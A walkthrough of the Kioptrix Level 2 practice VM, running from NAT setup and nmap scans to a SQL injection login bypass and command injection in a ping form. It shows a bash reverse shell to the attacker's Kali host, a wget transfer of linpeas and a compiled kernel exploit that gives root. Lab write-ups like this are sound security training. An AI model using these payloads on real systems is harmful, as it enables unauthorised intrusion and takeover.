# Kioptrix Level 2 Walkthrough

# Kioptrix Level 2

## Setup

By default the machine has the network card configured in Bridged mode and it is not recommended so we must configure it in NAT mode which has to be the same interface as our Kali.

To do this before opening the machine in our VMware we go to the configuration file.
![Untitled](Untitled.png)

we open it with our text editor and change the network name to NAT

![Untitled](Untitled%201.png)

```bash
#change
ethernet0.networkName = "Bridged"
#to
ethernet0.networkName = "NAT"
```

Then we open the machine from VMware and change the network interface to NAT.
![Untitled](Untitled%202.png)

We start and a series of windows will appear in which we must select "Do Nothing" in all of them until the machine finishes starting.
![Untitled](Untitled%203.png)

And we should have the machine ready to start.
## Machine Resolution

### Scanning and Vulnerability Analysis

We start with a scan with the arp command to obtain the ip of our machine.


```bash
sudo arp-scan -I eth0 --localnet
```

![Untitled](Untitled%204.png)

Once we have obtained our IP address, we will perform a scan with nmap to discover open ports.

```bash
nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.160 -oN Target
```

Output:

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 16:30 EDT
Initiating ARP Ping Scan at 16:30
Scanning 192.168.66.160 [1 port]
Completed ARP Ping Scan at 16:30, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:30
Scanning 192.168.66.160 [65535 ports]
Discovered open port 111/tcp on 192.168.66.160
Discovered open port 3306/tcp on 192.168.66.160
Discovered open port 22/tcp on 192.168.66.160
Discovered open port 443/tcp on 192.168.66.160
Discovered open port 80/tcp on 192.168.66.160
Discovered open port 996/tcp on 192.168.66.160
Discovered open port 631/tcp on 192.168.66.160
Completed SYN Stealth Scan at 16:30, 4.05s elapsed (65535 total ports)
Nmap scan report for 192.168.66.160
Host is up, received arp-response (0.0025s latency).
Scanned at 2023-08-20 16:30:10 EDT for 4s
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 64
80/tcp   open  http     syn-ack ttl 64
111/tcp  open  rpcbind  syn-ack ttl 64
443/tcp  open  https    syn-ack ttl 64
631/tcp  open  ipp      syn-ack ttl 64
996/tcp  open  xtreelic syn-ack ttl 64
3306/tcp open  mysql    syn-ack ttl 64
MAC Address: 00:0C:29:60:3D:BB (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

After a general scan, we will perform another one specifying the ports discovered to see which version of the services are running.

```bash
nmap -p22,80,111,443,631,996,3306 -sCV 192.168.66.160
```

Output:

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 16:31 EDT
Nmap scan report for 192.168.66.160
Host is up (0.00015s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            993/udp   status
|_  100024  1            996/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2023-08-20T17:22:36+00:00; -3h09m37s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
996/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:60:3D:BB (VMware)

Host script results:
|_clock-skew: -3h09m37s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.28 seconds
```

### Explotation

After analyzing the result we see that port 80 is open with the http service, so we go to see the web.

![Untitled](Untitled%205.png)

We observe a login with Username and Password fields.

Let's try to perform a basic SQLInjection command on the Username field.

```bash
' or 1 = 1 -- -
```

And we are successful and the following window appears:

![Untitled](Untitled%206.png)

We observe that it has the function of pinging the ip that we indicate. If we write the ip of the machine we obtain the following:

![Untitled](Untitled%207.png)

We try to concatenate commands with a ";" and see that they can be concatenated:
```bash
192.168.66.160 ; whoami
```

result:

![Untitled](Untitled%208.png)

Once here, we listen to our kali and execute the following command to get a reverse Shell

```bash
#kali
nc -nlvp 4444
#En la web
192.168.66.152 ; bash -i >& /dev/tcp/192.168.66.152/4444 0>&1
```

result:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444                     
listening on [any] 4444 ...
connect to [192.168.66.152] from (UNKNOWN) [192.168.66.160] 32779
bash: no job control in this shell
bash-3.00$ whoami
apache
```

### Privilege Escalation

We transfer [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases) from our Kali to the machine to see where we can escalate privileges, for this we start a server with Python in our Kali:

```bash
python3 -m http.server 80
```

and with wget from the machine we download Linpeas.

```bash
wget http://192.168.66.152/linpeas.sh
```

Once we have Linpeas on the target machine we run it and we see the following:

![Untitled](Untitled%209.png)

The machine is a CentOS 4.5 with Linux version 2.6.9.

We searched Google to see if there is a privilege escalation exploit with these characteristics and found the following exploit:

[https://www.exploit-db.com/exploits/9542](https://www.exploit-db.com/exploits/9542)

We download it to our machine and transfer it as we have done before.

Compile it

```bash
gcc 9542.c -o exploit
```

We give execution permissions

```bash
chmod +x exploit
```

and run it getting a shell as root

```bash
bash-3.00$ ./exploit
sh: no job control in this shell
sh-3.00# whoami
root
```

and we would have the machine finished.

Best regards and Happy Hacking :)

